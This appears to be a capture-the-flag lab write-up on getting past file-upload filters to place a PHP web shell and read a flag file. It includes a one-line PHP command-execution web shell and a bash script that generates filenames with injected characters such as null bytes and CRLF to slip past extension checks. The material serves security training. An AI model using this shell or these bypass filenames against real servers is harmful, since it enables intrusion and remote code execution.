# Type Filters
<br>
 The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. 
 Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"

 `Hint`: Start with a request that can be uploaded (e.g. jpg image), then try to find an allowed PHP extension that doesn't get blocked,
 then utilize one of the whitelist filter bypasses to bypass both extension filters.

 ---
- Test payload:
  ```php
  <?php echo "Hello HTB"; ?>
  ```
- Basic web shell:
  ```php
  <?php system($_REQUEST['cmd']); ?>
  ```
 - Web-all-content-types wordlist: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt

- We download the wordlist and filter for image-related `content-type`:
```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```
Note: `/image/jpg` is not in the list.

- Common mime types:
  - `jpeg`: `FF D8 FF`
  - `gif`: `GIF8` (GIF87a | GIF89a)

  <br>

 ---
<br>

# Exercise

## Fuzzing the `Content-Type` Header

We performed fuzzing on the `Content-Type` header to determine which types are allowed:  
![image](https://github.com/user-attachments/assets/b6376c4b-05d7-4821-80c6-04b0901559b9)  
![image](https://github.com/user-attachments/assets/287f8443-d7fc-41c0-93af-7140125607ca)  

The results revealed that the following types are permitted:  
- `image/gif`  
- `image/jpeg`  
- `image/png`  

Manually testing also confirmed that `image/jpg` is allowed.  


---

## Testing File Content Using Magic Bytes

We tested the uploaded files' content by checking their **magic bytes** to determine the permitted MIME types:  
![image](https://github.com/user-attachments/assets/b5d9d02b-5984-48b1-9473-bfd797379b27)  
![image](https://github.com/user-attachments/assets/8acbe838-c50e-48ac-8322-5a2948e611ff)  

---

## Attempting to Upload a `.php` Web Shell

We tried uploading a web shell with a `.php` extension. However, the server responded with the following error:  
**`Extension not allowed`**:  
![image](https://github.com/user-attachments/assets/290960dc-0829-456a-a84f-2c4ece59ded5)  

---

## Fuzzing Whitelist with Common Web Extensions

To investigate whether any web extensions other than image extensions were allowed, we fuzzed the server with **common web extensions** from SecLists.  
Unfortunately, no additional web extensions were accepted in the whitelist:  
![image](https://github.com/user-attachments/assets/c1bb7c02-26fc-47f6-a32c-0a0d3bf25942)  
![image](https://github.com/user-attachments/assets/05e266e9-ec3a-4658-a82a-47d273a079e2)  

---

## Observations

- **Blacklist Validation:** When the server uses a blacklist, it rejects files with `.php` extensions and responds with `Extension not allowed`.  
- **Whitelist Validation:** When the server uses a whitelist, it only accepts image extensions and responds with `Only images are allowed` for any other file types.


# Extension Fuzzing with a Custom Wordlist

We will perform extension fuzzing using a custom wordlist containing various payloads designed to bypass both whitelists and blacklists. To generate this wordlist, we used the following script:
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':' ';'; do
    for ext in '.php' '.phps' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
        echo "shell$char$ext.gif" >> wordlist.txt
        echo "shell$ext$char.gif" >> wordlist.txt
        echo "shell.gif$char$ext" >> wordlist.txt
        echo "shell.gif$ext$char" >> wordlist.txt
    done
done
```

![image](https://github.com/user-attachments/assets/d38dc1fb-0145-46e3-995e-b62b0d0f235a)
![image](https://github.com/user-attachments/assets/b5a30412-a7dc-4b71-ac59-7668dd551648)



# Accessing Uploaded Extensions and Executing Code

We observed that several extensions could be successfully uploaded. Next, we made a request to view the uploaded files and performed fuzzing using the same wordlist. This approach also tested access to the previously uploaded files:

![Fuzzing Uploaded Files](https://github.com/user-attachments/assets/daa20c87-d26a-4232-88f7-1b2935ae3e55)

## Identifying Executable Extensions

Among all the files that were successfully uploaded and accessible (status code 200), only a few were able to interpret and execute code:

![Executable Extensions](https://github.com/user-attachments/assets/3b96a212-41bd-46c3-aa74-8b3c1cb721d4)

## Deploying the Web Shell

We uploaded the web shell:

![Uploading Web Shell](https://github.com/user-attachments/assets/a3ea2241-07b1-4707-b1b1-3139e46985d5)

Then, we accessed the previously uploaded file:

![Accessing Web Shell](https://github.com/user-attachments/assets/efeea997-8b73-45b4-bbca-22ac059d925d)

## Capturing the Flag

Finally, we retrieved the flag and completed the lab:

![Flag Retrieved](https://github.com/user-attachments/assets/9782e1f3-54f1-4c10-93b5-e96ea9ba8600)







